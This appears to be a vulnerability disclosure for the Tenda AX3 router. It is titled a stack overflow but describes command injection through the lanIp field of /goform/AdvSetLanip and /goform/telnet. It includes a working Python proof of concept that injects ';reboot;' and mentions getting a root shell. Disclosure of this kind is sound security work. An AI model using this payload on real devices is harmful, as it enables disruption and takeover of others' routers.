# Tenda AX3 V16.03.12.11 Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-3476.html

## Affected version

![](https://github.com/yjzy00001/CVE/blob/main/vuln/rce/img/1.png)

## Vulnerability details

![](https://github.com/yjzy00001/CVE/blob/main/vuln/rce/img/2.png)

![](https://github.com/yjzy00001/CVE/blob/main/vuln/rce/img/3.png)

![](https://github.com/yjzy00001/CVE/blob/main/vuln/rce/img/4.png)

In /goform/AdvSetLanip, /goform/telnet, You can set lanip in AdvSetLanip. In the telnet function, the program will get the value of lanip and pass it into the system without any filtering. If the user passes in a malicious command, it will cause a command injection vulnerability.

## Poc

```python
import requests

url = "http://192.168.0.1/goform/AdvSetLanip"

lanIp = ';reboot;'

r = requests.post(url, data={'lanIp': lanIp})
print(r.content)

url = "http://192.168.0.1/goform/telnet"

r = requests.post(url, data={'lanIp': lanIp})
print(r.content)
```

You can see that the router restarts, forming a command injection vulnerability, and finally you can write exp to get root shell

